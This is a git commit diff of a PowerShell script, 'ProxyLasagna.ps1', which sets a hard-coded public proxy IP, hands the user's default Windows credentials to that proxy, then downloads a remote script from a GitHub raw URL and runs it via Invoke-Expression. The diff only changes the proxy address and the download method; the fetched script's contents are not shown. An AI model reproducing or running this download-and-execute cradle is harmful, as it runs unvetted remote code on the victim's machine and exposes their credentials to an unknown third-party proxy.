1fbbf679b13b23312d2033de789899f42d1c3b70
MarkDenkmn <145273692+MarkDenkmn@users.noreply.github.com>
2023-09-21 15:18:19 +0200

    Update ProxyLasagna.ps1

--- ProxyLasagna.ps1
+++ ProxyLasagna.ps1
@@ -1,17 +1,15 @@
 # Set the proxy server information (replace with your proxy server details)
-$proxyServer = "50.217.226.43:80"
+$proxyServer = "98.162.25.29:31679"
 
-# Set the URL of the raw GitHub script
-$githubScriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"
+# Set the URL of the PowerShell script you want to run
+$scriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"
 
 # Set the proxy settings for the current session
 [system.net.webrequest]::defaultwebproxy = New-Object System.Net.WebProxy($proxyServer)
-[system.net.webrequest]::defaultwebproxy.UseDefaultCredentials = $true
+[system.net.webrequest]::defaultwebproxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
 
-# Download the GitHub script
-$scriptContent = Invoke-RestMethod -Uri $githubScriptURL
-
-# Run the downloaded script
+# Download and run the script
+$scriptContent = (New-Object System.Net.WebClient).DownloadString($scriptURL)
 Invoke-Expression -Command $scriptContent
 
 # Remove the proxy settings to avoid affecting other PowerShell sessions
